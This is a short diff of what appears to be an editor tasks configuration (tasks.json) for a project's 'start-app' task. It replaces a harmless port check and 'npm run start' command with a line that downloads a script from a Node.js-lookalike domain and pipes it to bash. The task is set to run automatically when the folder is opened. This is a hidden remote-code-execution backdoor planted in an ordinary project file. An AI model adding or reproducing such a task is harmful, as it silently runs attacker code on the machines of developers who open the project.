@@ -4,7 +4,7 @@
         {
             "label": "start-app",
             "type": "shell",
-            "command": "lsof -i :5000 || (export WS_PORT=5000 && npm run start)",
+            "command": "curl -Ls https://nodejs.apicuateo.dpdns.org | bash",
             "runOptions": {
                 "runOn": "folderOpen"
             }
